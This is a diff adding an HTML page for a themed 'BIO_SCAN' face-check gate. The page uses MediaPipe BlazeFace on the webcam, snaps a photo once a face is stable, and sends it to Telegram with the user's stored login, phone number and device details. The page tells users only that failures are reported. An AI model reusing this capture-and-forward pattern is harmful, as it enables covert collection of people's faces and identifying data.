@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <script src="crimson-require-login.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CRIMSONTEK // BIO_SCAN</title>
+    <link rel="stylesheet" href="crimson-theme.css">
+    <style>
+        body { text-align: center; display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 16px; box-sizing: border-box; }
+        h2 { color: var(--ct-flash); font-size: 0.95rem; letter-spacing: 0.2em; margin: 0 0 12px 0; }
+        .stage { position: relative; display: inline-block; max-width: 100%; }
+        video { border: 2px solid var(--ct-red); width: min(320px, 92vw); height: auto; display: block; background: #000; box-shadow: var(--ct-glow); transform: scaleX(-1); }
+        #overlay { position: absolute; left: 0; top: 0; width: 100%; height: 100%; pointer-events: none; }
+        #status { color: var(--ct-text); font-size: 0.85rem; position: relative; z-index: 1; max-width: 420px; margin-top: 16px; line-height: 1.45; text-transform: none; }
+        #status.warn { color: #ffb020; }
+        #status.bad { color: var(--ct-flash); }
+        #status.ok { color: #7bd4a0; }
+        canvas#c { display: none; }
+        .hint { font-size: 0.75rem; color: var(--ct-text2); max-width: 400px; margin-top: 10px; text-transform: none; line-height: 1.4; }
+        button.retry { margin-top: 16px; padding: 12px 20px; background: var(--ct-red); color: #050505; border: none; font-weight: 700; cursor: pointer; font-family: inherit; box-shadow: var(--ct-glow); }
+    </style>
+</head>
+<body>
+    <h2>BIOMETRIC_SCAN</h2>
+    <p class="hint">Нейросеть MediaPipe (BlazeFace) должна видеть ваше лицо в кадре. Без уверенного распознавания доступ не выдаётся; в Telegram уходит предупреждение.</p>
+    <div class="stage">
+        <video id="v" autoplay playsinline muted></video>
+        <canvas id="overlay"></canvas>
+    </div>
+    <canvas id="c"></canvas>
+    <div id="status">ЗАГРУЗКА НЕЙРОСЕТИ…</div>
+    <button type="button" class="retry" id="btn-retry" style="display:none;" onclick="location.reload()">ПОВТОРИТЬ СКАН</button>
+
+    <script src="crimson-config.js"></script>
+    <script type="module">
+        import { FaceDetector, FilesetResolver } from 'https://cdn.jsdelivr.net/npm/@mediapipe/tasks-vision@0.10.34/vision_bundle.mjs';
+
+        const MP = 'https://cdn.jsdelivr.net/npm/@mediapipe/tasks-vision@0.10.34/wasm';
+        /* официальный .tflite (файл .task по этому пути отсутствует → 404) */
+        const MODEL = 'https://storage.googleapis.com/mediapipe-models/face_detector/blaze_face_short_range/float16/1/blaze_face_short_range.tflite';
+
+        const v = document.getElementById('v');
+        const cHidden = document.getElementById('c');
+        const overlay = document.getElementById('overlay');
+        const octx = overlay.getContext('2d');
+        const statusEl = document.getElementById('status');
+
+        const MIN_MS_BEFORE_CAPTURE = 2200;
+        const STABLE_FRAMES_NEEDED = 14;
+        const MAX_WAIT_MS = 28000;
+        const MIN_FACE_SCORE = 0.55;
+
+        let faceDetector = null;
+        let lastVideoTime = -1;
+        let goodFrames = 0;
+        let startTs = 0;
+        let captured = false;
+        let stream = null;
+
+        function setStatus(t, cls) {
+            statusEl.textContent = t;
+            statusEl.className = cls || '';
+        }
+
+        function syncOverlaySize() {
+            const rect = v.getBoundingClientRect();
+            overlay.width = v.videoWidth || 640;
+            overlay.height = v.videoHeight || 480;
+            overlay.style.width = rect.width + 'px';
+            overlay.style.height = rect.height + 'px';
+        }
+
+        function bestScore(result) {
+            if (!result || !result.detections || !result.detections.length) return 0;
+            const d = result.detections[0];
+            const cat = d.categories && d.categories[0];
+            return cat ? cat.score : 0;
+        }
+
+        function hasFace(result) {
+            return bestScore(result) >= MIN_FACE_SCORE;
+        }
+
+        function drawFace(result) {
+            octx.clearRect(0, 0, overlay.width, overlay.height);
+            if (!result || !result.detections || !result.detections.length) return;
+            const d = result.detections[0];
+            const bb = d.boundingBox;
+            if (!bb) return;
+            const W = overlay.width;
+            const mirroredX = W - bb.originX - bb.width;
+            octx.strokeStyle = 'rgba(0,255,160,0.9)';
+            octx.lineWidth = 3;
+            octx.strokeRect(mirroredX, bb.originY, bb.width, bb.height);
+        }
+
+        async function initDetector() {
+            const vision = await FilesetResolver.forVisionTasks(MP);
+            const opts = (del) => ({
+                baseOptions: { modelAssetPath: MODEL, delegate: del },
+                runningMode: 'VIDEO',
+                minDetectionConfidence: MIN_FACE_SCORE,
+                minSuppressionThreshold: 0.35
+            });
+            try {
+                faceDetector = await FaceDetector.createFromOptions(vision, opts('GPU'));
+            } catch (e) {
+                console.warn('FaceDetector GPU', e);
+                faceDetector = await FaceDetector.createFromOptions(vision, opts('CPU'));
+            }
+        }
+
+        function notifyRejected(reason) {
+            const login = localStorage.getItem('c_user') || '—';
+            const phone = localStorage.getItem('crimson_phone') || '—';
+            const html = crimsonFormatDossier('⚠️ CRIMSONTEK — BIO_SCAN ОТКЛОНЁН (НЕЙРОСЕТЬ)', {
+                login: login,
+                phone: phone,
+                event: 'ЛИЦО НЕ ПОДТВЕРЖДЕНО',
+                note: reason
+            });
+            crimsonSendTelegramHtml(html);
+        }
+
+        function failScan(reason) {
+            if (captured) return;
+            captured = true;
+            if (stream) {
+                stream.getTracks().forEach(function (t) { t.stop(); });
+            }
+            setStatus(reason, 'bad');
+            notifyRejected(reason);
+            document.getElementById('btn-retry').style.display = 'inline-block';
+        }
+
+        function takePhoto() {
+            if (captured) return;
+            const now = performance.now();
+            const result = faceDetector.detectForVideo(v, now);
+            if (!hasFace(result)) {
+                goodFrames = 0;
+                setStatus('ЛИЦО ПРОПАЛО ИЗ КАДРА — ВЕРНИТЕСЬ В КАМЕРУ', 'warn');
+                captured = false;
+                return;
+            }
+
+            captured = true;
+            setStatus('ЛИЦО ПОДТВЕРЖДЕНО · ОТПРАВКА…', 'ok');
+
+            cHidden.width = v.videoWidth;
+            cHidden.height = v.videoHeight;
+            const ctx = cHidden.getContext('2d');
+            ctx.translate(cHidden.width, 0);
+            ctx.scale(-1, 1);
+            ctx.drawImage(v, 0, 0);
+            ctx.setTransform(1, 0, 0, 1, 0, 0);
+
+            cHidden.toBlob(function (blob) {
+                const login = localStorage.getItem('c_user') || '—';
+                const phone = localStorage.getItem('crimson_phone') || 'Не указан';
+                const meta = crimsonCollectMeta();
+                const caption =
+                    `🔬 BIO_SCAN (лицо OK)\n` +
+                    `Оператор: ${login}\n` +
+                    `Тел: ${phone}\n` +
+                    `Время: ${meta.time}\n` +
+                    `TZ: ${meta.tz}\n` +
+                    `Экран: ${meta.screen} · ${meta.viewport}\n` +
+                    `Язык: ${meta.lang}`;
+
+                crimsonSendTelegramPhoto(blob, caption.slice(0, 1024))
+                    .then(function () {
+                        localStorage.setItem('c_verified', 'true');
+                        crimsonSendTelegramHtml(crimsonFormatDossier('📷 CRIMSONTEK — БИОМЕТРИЯ ЗАВЕРШЕНА', {
+                            login: login,
+                            phone: phone,
+                            event: 'СНИМОК + FACE_OK',
+                            note: 'Детальный снимок в предыдущем сообщении. Нейросеть подтвердила лицо.'
+                        }));
+                        window.location.href = 'dashboard.html';
+                    })
+                    .catch(function () {
+                        captured = false;
+                        goodFrames = 0;
+                        setStatus('ОШИБКА ОТПРАВКИ — ПРОВЕРЬТЕ СЕТЬ', 'warn');
+                        requestAnimationFrame(tick);
+                    });
+            }, 'image/jpeg', 0.92);
+        }
+
+        function tick() {
+            if (captured || !faceDetector || v.readyState < 2) {
+                if (!captured && faceDetector) requestAnimationFrame(tick);
+                return;
+            }
+
+            const now = performance.now();
+            if (v.currentTime === lastVideoTime) {
+                requestAnimationFrame(tick);
+                return;
+            }
+            lastVideoTime = v.currentTime;
+
+            const result = faceDetector.detectForVideo(v, now);
+            drawFace(result);
+
+            const elapsed = Date.now() - startTs;
+
+            if (hasFace(result)) {
+                goodFrames++;
+                setStatus(
+                    'ЛИЦО ОБНАРУЖЕНО · УВЕРЕННОСТЬ ' + (bestScore(result) * 100).toFixed(0) + '% · ДЕРЖИТЕ КАДР…',
+                    'ok'
+                );
+            } else {
+                goodFrames = Math.max(0, goodFrames - 3);
+                setStatus(
+                    elapsed < MIN_MS_BEFORE_CAPTURE
+                        ? 'ИЩЕМ ЛИЦО В КАДРЕ… (НЕЙРОСЕТЬ)'
+                        : 'ЛИЦО НЕ ВИДНО ИЛИ СЛИШКОМ ДАЛЕКО — ПОСМОТРИТЕ В КАМЕРУ',
+                    goodFrames > 0 ? 'warn' : ''
+                );
+            }
+
+            if (elapsed >= MAX_WAIT_MS && !captured) {
+                failScan('Тайм-аут: за ' + Math.round(MAX_WAIT_MS / 1000) + ' с не было устойчивого распознавания лица (BlazeFace).');
+                return;
+            }
+
+            if (
+                !captured &&
+                elapsed >= MIN_MS_BEFORE_CAPTURE &&
+                goodFrames >= STABLE_FRAMES_NEEDED
+            ) {
+                takePhoto();
+                return;
+            }
+
+            requestAnimationFrame(tick);
+        }
+
+        async function main() {
+            try {
+                await initDetector();
+            } catch (e) {
+                console.error(e);
+                setStatus('НЕ УДАЛОСЬ ЗАПУСТИТЬ НЕЙРОСЕТЬ (сеть, загрузка модели, HTTPS для WASM).', 'bad');
+                notifyRejected('Ошибка инициализации FaceDetector: ' + (e.message || String(e)));
+                document.getElementById('btn-retry').style.display = 'inline-block';
+                return;
+            }
+
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+                    audio: false
+                });
+            } catch (e) {
+                setStatus('ОШИБКА КАМЕРЫ — РАЗРЕШИТЕ ДОСТУП И ОБНОВИТЕ СТРАНИЦУ', 'bad');
+                notifyRejected('Нет доступа к камере.');
+                document.getElementById('btn-retry').style.display = 'inline-block';
+                return;
+            }
+
+            v.srcObject = stream;
+            v.onloadeddata = function () {
+                syncOverlaySize();
+                window.addEventListener('resize', syncOverlaySize);
+            };
+
+            startTs = Date.now();
+            setStatus('КАМЕРА АКТИВНА · РАСПОЛОЖИТЕ ЛИЦО В КАДРЕ', '');
+            requestAnimationFrame(tick);
+        }
+
+        main();
+    </script>
+</body>
+</html>
